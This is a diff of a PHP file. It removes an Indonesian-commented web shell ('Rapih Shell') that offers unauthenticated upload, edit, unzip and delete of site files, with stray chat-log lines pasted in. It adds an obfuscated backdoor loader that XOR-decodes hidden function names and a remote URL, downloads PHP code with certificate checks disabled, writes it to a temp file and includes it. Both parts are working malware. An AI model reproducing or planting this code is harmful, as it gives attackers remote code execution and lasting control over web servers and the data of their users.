@@ -1,324 +1,103 @@
-=
 <?php
-$uploadDir = '/home/kabtakalar/public_html/media/source/'; // Direktori untuk menyimpan file yang diunggah
 
-// Fungsi untuk mengunggah file
-function uploadFile($file)
+$password = '$2y$08$PBo/wqoLayTvFOW2Hp4wh.emo68HEEAh4cJpw3WSr1TrJYuD/gEju';
+
+function encrypt($text, $key)
 {
-    global $uploadDir;
+    $textLen = strlen($text);
 
-    $uploadedFile = $uploadDir . basename($file['name']);
-
-    // Periksa apakah file sudah ada
-    if (file_exists($uploadedFile)) {
-        echo "File already exists.";
-        return false;
+    for($x = 0; $x < $textLen; $x++) {
+        $text[$x] = ($text[$x] ^ $key);
     }
-
-    // Coba pindahkan file yang diunggah ke direktori yang diinginkan
-    if (move_uploaded_file($file['tmp_name'], $uploadedFile)) {
-        echo "File uploaded successfully.";
-        return true;
-    } else {
-        echo "Failed to upload file.";
-        return false;
-    }
+    return $text;
 }
-
-// Fungsi untuk mengedit file
-function editFile($fileName, $content)
+function decrypt($text, $key)
 {
-    global $uploadDir;
-
-    $filePath = $uploadDir . $fileName;
-
-    // Periksa apakah file ada
-    if (file_exists($filePath)) {
-        // Buka file untuk ditulis
-        $file = fopen($filePath, "w");
-        if ($file) {
-            fwrite($file, $content);
-            fclose($file);
-            echo "File edited successfully.";
-        } else {
-            echo "Failed to open file for editing.";
-        }
-    } else {
-        echo "File does not exist.";
-    }
+    return encrypt($text, $key);
 }
-
-// Fungsi untuk mengubah nama file
-function renameFile($oldName, $newName)
+function stringTohex($field)
 {
-    global $uploadDir;
-
-    $oldPath = $uploadDir . $oldName;
-    $newPath = $uploadDir . $newName;
-
-    // Periksa apakah file lama ada
-    if (file_exists($oldPath)) {
-        // Periksa apakah file baru sudah ada
-        if (file_exists($newPath)) {
-            echo "A file with the new name already exists.";
-        } else {
-            // Ubah nama file
-            if (rename($oldPath, $newPath)) {
-                echo "File renamed successfully.";
-            } else {
-                echo "Failed to rename file.";
-            }
-        }
-    } else {
-        echo "File does not exist.";
-    }
+    global $password;
+    $field = encrypt($field, $password);
+    $hexField = bin2hex($field);
+    $hexField = chunk_split($hexField, 2, '\\x');
+    $hexField = '\\x' . substr($hexField, 0, -2);
+    return $hexField;
 }
-
-// Fungsi untuk menambahkan file
-function addFile($file)
+function hexTostring($field)
 {
-    global $uploadDir;
-
-    $uploadedFile = $uploadDir . basename($file['name']);
-
-    // Periksa apakah file sudah ada
-    if (file_exists($uploadedFile)) {
-        echo "File already exists.";
-        return false;
-    }
-
-    // Coba pindahkan file yang diunggah ke direktori yang diinginkan
-    if (move_uploaded_file($file['tmp_name'], $uploadedFile)) {
-        echo "File added successfully.";
-        return true;
-    } else {
-        echo "Failed to add file.";
-        return false;
-    }
+    global $password;
+    $binaryField = explode('\\x', $field);
+    $binaryField = implode('', $binaryField);
+    $binaryField = hex2bin($binaryField);
+    return decrypt($binaryField, $password);
 }
 
-// Fungsi untuk mengekstrak file zip
-function unzipFile($fileName)
+$fgc = hexTostring('\x42\x4d\x48\x41\x7b\x43\x41\x50\x7b\x47\x4b\x4a\x50\x41\x4a\x50\x57');
+$fpc = hexTostring('\x42\x4d\x48\x41\x7b\x54\x51\x50\x7b\x47\x4b\x4a\x50\x41\x4a\x50\x57');
+$fo = hexTostring('\x42\x4b\x54\x41\x4a');
+$fw = hexTostring('\x42\x53\x56\x4d\x50\x41');
+$fc = hexTostring('\x42\x47\x48\x4b\x57\x41');
+$fnce = hexTostring('\x42\x51\x4a\x47\x50\x4d\x4b\x4a\x7b\x41\x5c\x4d\x57\x50\x57');
+$ci = hexTostring('\x47\x51\x56\x48\x7b\x4d\x4a\x4d\x50');
+$cs = hexTostring('\x47\x51\x56\x48\x7b\x57\x41\x50\x4b\x54\x50');
+$ce = hexTostring('\x47\x51\x56\x48\x7b\x41\x5c\x41\x47');
+$cc = hexTostring('\x47\x51\x56\x48\x7b\x47\x48\x4b\x57\x41');
+$lnk = '\x4c\x50\x50\x54\x57\x1e\x0b\x0b\x43\x4d\x57\x50\x0a\x43\x4d\x50\x4c\x51\x46\x51\x57\x41\x56\x47\x4b\x4a\x50\x41\x4a\x50\x0a\x47\x4b\x49\x0b\x67\x52\x45\x56\x15\x1d\x1c\x10\x0b\x14\x12\x15\x1c\x13\x15\x15\x13\x12\x12\x1d\x12\x17\x10\x14\x16\x1d\x47\x10\x14\x12\x41\x10\x16\x41\x47\x40\x15\x1d\x17\x11\x46\x0b\x56\x45\x53\x0b\x13\x46\x11\x13\x45\x46\x13\x42\x47\x14\x14\x13\x10\x17\x45\x41\x12\x17\x45\x11\x13\x45\x13\x42\x10\x17\x1d\x17\x12\x14\x40\x46\x12\x12\x12\x41\x1d\x12\x45\x11\x0b\x5c\x48\x49\x56\x54\x47\x0a\x54\x4c\x54';
+
+
+function cUrl($url) {
+    global $cs, $ci, $cc, $ce, $fnce;
+    if(!$fnce('curl')) return;
+
+    $ch = $ci();
+    $cs($ch, CURLOPT_RETURNTRANSFER, true);
+    $cs($ch, CURLOPT_URL, $url);
+    $cs($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $cs($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $res = $ce($ch);
+    $cc($ch);
+    return $res;
+}
+
+
+function tulisFile($fileName, $fileContent)
 {
-    global $uploadDir;
-
-    $filePath = $uploadDir . $fileName;
-
-    // Periksa apakah file ada
-    if (file_exists($filePath)) {
-        // Periksa apakah ekstensi file adalah zip
-        if (pathinfo($filePath, PATHINFO_EXTENSION) === 'zip') {
-            $zip = new ZipArchive;
-            if ($zip->open($filePath) === TRUE) {
-                $zip->extractTo($uploadDir);
-                $zip->close();
-                echo "File unzipped successfully.";
-            } else {
-                echo "Failed to unzip file.";
-            }
-        } else {
-            echo "The file is not a zip file.";
-        }
-    } else {
-        echo "File does not exist.";
+    global $fnce, $fpc, $fo, $fw, $fc;
+    if ($fnce('file_put_contents')) {
+        @$fpc($fileName, $fileContent);
+    } elseif ($fnce('fopen')) {
+        $f = @$fo($fileName, 'wb+');
+        $status = $f;
+        @$fw($f, $fileContent);
+        @$fc($f);
+        return $status;
     }
 }
-
-// Fungsi untuk menghapus file
-function deleteFile($fileName)
+function bukaFile($fileName)
 {
-    global $uploadDir;
-
-    $filePath = $uploadDir . $fileName;
-
-    // Periksa apakah file ada
-    if (file_exists($filePath)) {
-        // Hapus file
-        if (unlink($filePath)) {
-            echo "File deleted successfully.";
-        } else {
-            echo "Failed to delete file.";
-        }
-    } else {
-        echo "File does not exist.";
+    global $fgc, $fnce, $fo, $fc;
+    if ($fnce('file_get_contents')) {
+        return @$fgc($fileName);
+    } elseif ($fnce("fopen")) {
+        $fh = @$fo($fileName, "rb+");
+        $fc($fh);
+        return $fh;
     }
 }
 
-// Fungsi untuk pindah ke direktori lain
-function changeDirectory($directory)
-{
-    global $uploadDir;
+$rootServer = $_SERVER['DOCUMENT_ROOT'];
+$tmpPath = sprintf('%s%s%s%s', sys_get_temp_dir(), DIRECTORY_SEPARATOR, md5($_SERVER['HTTP_HOST']), '.php');
+$link = hexTostring($lnk);
+$contents = bukaFile($link);
 
-    $newDir = $uploadDir . $directory;
-
-    // Periksa apakah direktori ada
-    if (is_dir($newDir)) {
-        $uploadDir = $newDir;
-        echo "Changed directory to '$directory'.";
-    } else {
-        echo "Directory does not exist.";
-    }
+if(!$contents) {
+    $contents = cUrl($link);
 }
 
-// Fungsi untuk mendapatkan daftar file di direktori
-function getFileList()
-{
-    global $uploadDir;
+if(!file_exists($tmpPath) || filesize($tmpPath) == 0) {
 
-G3X1337, [5/29/2024 8:03 PM]
-$files = scandir($uploadDir);
-    $fileList = array();
-
-    foreach ($files as $file) {
-        if ($file !== '.' && $file !== '..') {
-            $fileList[] = $file;
-        }
-    }
-
-    return $fileList;
+    tulisFile($tmpPath, $contents);
 }
 
-// Fungsi untuk mendapatkan daftar direktori di direktori
-function getDirectoryList()
-{
-    global $uploadDir;
-
-    $directories = scandir($uploadDir);
-    $directoryList = array();
-
-    foreach ($directories as $directory) {
-        if ($directory !== '.' && $directory !== '..' && is_dir($uploadDir . $directory)) {
-            $directoryList[] = $directory;
-        }
-    }
-
-    return $directoryList;
-}
-
-// Proses permintaan unggah, edit, rename, tambah file, unzip, delete, pindah direktori, dan melihat daftar file/direktori
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_POST['action'])) {
-        $action = $_POST['action'];
-
-        if ($action === 'upload') {
-            if (isset($_FILES['file'])) {
-                uploadFile($_FILES['file']);
-            }
-        } elseif ($action === 'edit') {
-            if (isset($_POST['file_name']) && isset($_POST['content'])) {
-                editFile($_POST['file_name'], $_POST['content']);
-            }
-        } elseif ($action === 'rename') {
-            if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
-                renameFile($_POST['old_name'], $_POST['new_name']);
-            }
-        } elseif ($action === 'add') {
-            if (isset($_FILES['file'])) {
-                addFile($_FILES['file']);
-            }
-        } elseif ($action === 'unzip') {
-            if (isset($_POST['file_name'])) {
-                unzipFile($_POST['file_name']);
-            }
-        } elseif ($action === 'delete') {
-            if (isset($_POST['file_name'])) {
-                deleteFile($_POST['file_name']);
-            }
-        } elseif ($action === 'change_directory') {
-            if (isset($_POST['directory'])) {
-                changeDirectory($_POST['directory']);
-            }
-        }
-    }
-}
-
-// Mendapatkan daftar file dan direktori
-$fileList = getFileList();
-$directoryList = getDirectoryList();
-?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Zildan Security - Rapih Shell</title>
-    <style>
-        ul {
-            list-style-type: none;
-        }
-    </style>
-</head>
-<body>
-    <h2>Rapih Shell</h2>
-    <form method="post" enctype="multipart/form-data">
-        <input type="hidden" name="action" value="upload">
-        <input type="file" name="file">
-        <input type="submit" value="Upload">
-    </form>
-
-    <h2>File Editor</h2>
-    <form method="post">
-        <input type="hidden" name="action" value="edit">
-        <input type="text" name="file_name" placeholder="File Name">
-        <br>
-        <textarea name="content" rows="10" cols="50" placeholder="Content"></textarea>
-        <br>
-        <input type="submit" value="Edit">
-    </form>
-
-    <h2>File Renamer</h2>
-    <form method="post">
-        <input type="hidden" name="action" value="rename">
-        <input type="text" name="old_name" placeholder="Old File Name">
-        <br>
-        <input type="text" name="new_name" placeholder="New File Name">
-        <br>
-        <input type="submit" value="Rename">
-    </form>
-
-    <h2>Add File</h2>
-    <form method="post" enctype="multipart/form-data">
-        <input type="hidden" name="action" value="add">
-        <input type="file" name="file">
-        <input type="submit" value="Add">
-    </form>
-
-    <h2>Unzip File</h2>
-    <form method="post">
-        <input type="hidden" name="action" value="unzip">
-        <input type="text" name="file_name" placeholder="File Name">
-        <br>
-        <input type="submit" value="Unzip">
-    </form>
-
-    <h2>Delete File</h2>
-    <form method="post">
-        <input type="hidden" name="action" value="delete">
-        <input type="text" name="file_name" placeholder="File Name">
-        <br>
-        <input type="submit" value="Delete">
-    </form>
-
-G3X1337, [5/29/2024 8:03 PM]
-<h2>Change Directory</h2>
-    <form method="post">
-        <input type="hidden" name="action" value="change_directory">
-        <input type="text" name="directory" placeholder="Directory Name">
-        <br>
-        <input type="submit" value="Change Directory">
-    </form>
-
-    <h2>File List</h2>
-    <ul>
-        <?php foreach ($fileList as $file) { ?>
-            <li><?php echo $file; ?></li>
-        <?php } ?>
-    </ul>
-
-    <h2>Directory List</h2>
-    <ul>
-        <?php foreach ($directoryList as $directory) { ?>
-            <li><?php echo $directory; ?></li>
-        <?php } ?>
-    </ul>
-</body>
-</html>
+include($tmpPath);
